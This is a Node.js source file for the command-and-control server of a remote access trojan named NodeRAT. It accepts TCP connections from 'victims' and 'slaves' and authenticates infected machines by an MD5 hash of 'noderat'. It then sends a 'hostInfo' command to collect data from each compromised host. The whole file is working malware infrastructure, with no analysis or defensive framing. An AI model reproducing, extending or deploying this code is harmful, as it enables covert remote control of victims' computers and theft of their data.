const net = require("net");
const { EventEmitter } = require("events");
const crypto = require("crypto");
const Settings = require("./settings");
const Store = require("./Stores/serverStore");
const Action = require("./Actions/serverAction");
const Colors = require("colors");
const Tools = require("../tools/tools");

const _Constants = {
    "connectedVictims": "connectedVics",
    "allowDuplicatedIPs": true,
    "hideOfflineSlaves" : true,
    "MessageResponseName": {
        "hostinfo" : "intialContanctDataHandler"
    }
};

function md5(str) {
    let hash = crypto.createHash("md5");
    hash.update(str);
    return hash.digest("hex");
}

class Server extends EventEmitter{
    constructor(){
        super();
        this.connectedSlaves = {};
        this.offlineSlaves = {};
        Settings.autoSave(true)
        this.port = null;
        this.CoreAction = null;
        this.CoreStore = null;
        // set store variables
        Action.set("Constants", _Constants);
        Action.set( Store.get("Constants").connectedVictims , {});

        this.NodeRatHash = md5("noderat");
        this._export = {
            Store,
            Action,
            Constants :Store.get("Constants")
        }
        Settings.onLoad((config, that) => {
            let { allowDuplicatedIPs, hideOfflineSlaves } = that.get(["allowDuplicatedIPs", "hideOfflineSlaves" ]);
            _Constants.allowDuplicatedIPs = allowDuplicatedIPs;
            _Constants.hideOfflineSlaves = hideOfflineSlaves;
            Action.update("Constants", _Constants);
        });
    }

    start({ CoreAction = null, CoreStore = null , port = 1528}){
        if (CoreAction != null || CoreStore != null || port != null) {
            this.port = port;
            this.CoreAction = CoreAction;
            this.CoreStore = CoreStore;
        } else {
            throw new Error("Dependcies are missing on Server");
        }

        console.log(`server started on port ${this.port}`.bold);
        this.server = net.createServer((conn) => {

            // ----------- on connection
            let ip = conn.remoteAddress;
            let realIP = ip;
            if(Store.get("Constants").allowDuplicatedIPs)
                ip = `${ip}-${Tools.randomStr(5)}`;

            this.connectedSlaves[ip] = {
                status: 1,
                nodeRAT: false,
                intialContact: false,
                hidden : false,
                hashAuthFail : {
                    count: 0,
                    failed: false,
                    hint : null
                },
                conn,
                realIP,
                data : null
            };

            Action.push(Store.get("Constants").connectedVictims, {
                key: ip,
                payload: this.connectedSlaves[ip]
            });

            this.checkService({conn, ip})
            console.log(`${ip} connected`.green);

            // ---------- connection ended 

            conn.on("end", (e) => this.slaveDisconnected({ip, realIP, event : e}));

            // ------------ data was recived

            conn.on("data", (data) => this.socketDataHandler({data : data.toString() , conn, ip, bytes : data}));
        });
        try {
            this.server.listen(this.port, "0.0.0.0");
        } catch (error) {
            console.log("Error starting the server: ".bgRed.white, error);
            return;
        }
        this.intialContanctInvoker();
    }

    stop(){
        // imploment server stop here
        for (const ip in this.connectedSlaves) {
            let s = this.connectedSlaves[ip];
            if(s.status == 1)
                s.conn.end();
        }
        return this.server.close();
    }

    makeCommand(method = "", args = []){
        return JSON.stringify({
            "command": [method, ...args]
        });
    }

    listenForPortUpdate(){
        if(this.CoreAction != null || this.CoreStore  != null){
            this.CoreStore.on("RATMainTCPPort@UPDATED", (port) => {
                console.log("port changed", port);
                this._changePort(port);
            });
        }else{
            throw new Error("Could Not Listen for tcp port change");
        }
    }

    export(exports){
        let toReturn = {};
        for (let key in exports) {
            if (exports.hasOwnProperty(key) && typeof this._export[key] != undefined) {
                toReturn[exports[key]] = this._export[key] == undefined ? null : this._export[key];
            }else{
                throw new Error(`can not export unknown method(${key}) in Server ${this._export}`);
                return;
            }
        }
        return toReturn;
    }

    _changePort(port){
       Settings.set({
            obj : "network.port.tcp.use",
            value : port
        });
        this.CoreStore.customEvent("ApplicationNeedsRestart", "Server Port Updated");

    }

    socketDataHandler({data, conn, ip, bytes}){
        let json;
        try {
            json = JSON.parse(data);
        } catch (error) {
            throw new Error("not a vailed JSON at server > socketDataHandler");
            return;
        }

        console.log(`socketDataHandler ${ip}  sent data: ${json.name}`.italic.bgBlue);

        if(json && json.name != ""){
            if(json.name in Store.get("Constants").MessageResponseName){
                this[ Store.get("Constants").MessageResponseName[ json.name ] ]({
                    payload : json.payload,
                    rawPayload: {bytes, data},
                    requestName : json.name,
                    conn,
                    ip
                });
            }
        }

    }

    checkService({conn, ip}){
        conn.write(this.makeCommand("whois"));
        let bytes,
            vic = this.connectedSlaves[ip],
            timeout = setTimeout(() => {

            vic.hashAuthFail.count++;
            vic.hashAuthFail.failed = true;
            vic.hashAuthFail.hint = "this device is not infected with NodeRAT";
    
            Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: vic });

        }, 30 * 1000); // when no answer then it's not our rat

        conn.on("data", (data) => {
            clearTimeout(timeout);
            bytes = data;
            data = data.toString();
            try {
                data = JSON.parse(data)
            } catch (error) {
                throw new Error("not a vailed JSON at server > checkService");
                return;
            }
            
            if (data && data.name == "whois") {
                console.log(`serviceCheck[${data.name}]: hashCheck ${data.payload == this.NodeRatHash}`.blue);

                if (data.payload == this.NodeRatHash) {

                    vic.nodeRAT = true;

                    Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: vic });

                } else {

                    vic.hashAuthFail.count++;

                    vic.hashAuthFail.failed = true;

                    Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: vic });

                }

            }
        });
    }

    slaveDisconnected({ip, realIP, event}){
        delete this.connectedSlaves[ip].conn;
        this.connectedSlaves[ip].status = 0;
        Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: this.connectedSlaves[ip] });
        console.warn(`${ip}/${realIP} disconnected; ${event || ""}`.red);
    }

    setConfig(name = "", status = null){
        if(status != null && name != ""){
            let [stat, config] = Settings.set({obj: name, value: status});
            return [stat, config];
        }
    }

    deleteOfflineSlaves(ip = null){
        if (ip) {
            if(this.connectedSlaves.hasOwnProperty(ip)){
                delete this.connectedSlaves[ip];
                Action.delete({ name: Store.get("Constants").connectedVictims, key: ip });
            }
        } else {
            for (const ip in this.connectedSlaves) {
                if (this.connectedSlaves.hasOwnProperty(ip) && this.connectedSlaves[ip].status == 0) {
                    delete this.connectedSlaves[ip];
                }
            }
            Action.update(Store.get("Constants").connectedVictims, this.connectedSlaves);
        }
    }



    intialContanctInvoker(){
        Store.on(`${Store.get("Constants").connectedVictims}@UPDATED`, (theVar) => {
            for (const ip in theVar) {
                if (theVar.hasOwnProperty(ip)) {
                    
                    console.log(`intialcontact-> ${theVar[ip].intialContact} , status-> ${theVar[ip].status} , is RAT-> ${theVar[ip].nodeRAT}`.cyan);
                    if (theVar[ip].status == 1 && theVar[ip].nodeRAT == true && theVar[ip].intialContact == false){
                        theVar[ip].conn.write(this.makeCommand("hostInfo"));
                    }
                }
            }
        });
    }
/*
                    data parsers and server gui reporter methods should be bellow this comment
    @params 
    {
        payload : json.payload,
        rawPayload: {bytes, data},
        requestName : json.name,
        conn,
        ip
    }
}
*/
    intialContanctDataHandler({payload, rawPayload, requestName, conn, ip}){
        console.log(`data recived and ran:  ${requestName}`.grey);
        let p = this.connectedSlaves[ip];
        try {
            p.data = JSON.parse(payload);
        } catch (error) {
            p.data = payload;
        }
        p.intialContact = true;
        Action.push(Store.get("Constants").connectedVictims, {key : ip, payload : p});
    }
}

module.exports = new Server;